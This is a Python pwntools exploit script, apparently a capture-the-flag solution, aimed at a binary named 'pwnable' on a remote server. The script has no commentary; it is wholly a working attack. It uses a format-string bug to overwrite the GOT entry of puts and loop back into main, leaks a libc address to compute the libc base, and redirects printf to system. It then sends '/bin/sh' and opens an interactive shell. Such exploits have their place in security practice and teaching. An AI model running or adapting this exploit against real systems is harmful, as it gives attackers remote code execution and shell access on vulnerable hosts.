from pwn import *
from fmtstr import FormatString
from hexdump import hexdump

e = ELF('pwnable')
l = ELF('libc-2.23.so')
r = remote('exploit.live', 9005)
r.readline()

fmt = FormatString(offset=6, written=0, bits=64)
fmt[e.got[b'puts']] = e.symbols[b'main']+0x29
payload, sig = fmt.build()

hexdump(payload)
log.info(payload)
r.sendline(payload)
r.recvline()
r.recvline()
r.sendline("\n%35$p")
r.recvline()
x = r.recvline()[2:-1]
libc_main_243 = int(x, 16)
print("%x" % libc_main_243)
libc_base = libc_main_243 - l.symbols[b'__libc_start_main'] - 0xf0

fmt = FormatString(offset=9, written=0, bits=64)
fmt[e.got[b'printf']] = l.symbols[b'system'] + libc_base
payload, sig = fmt.build()
hexdump(payload)

r.sendline(payload)
r.sendline('/bin/sh')
r.interactive()
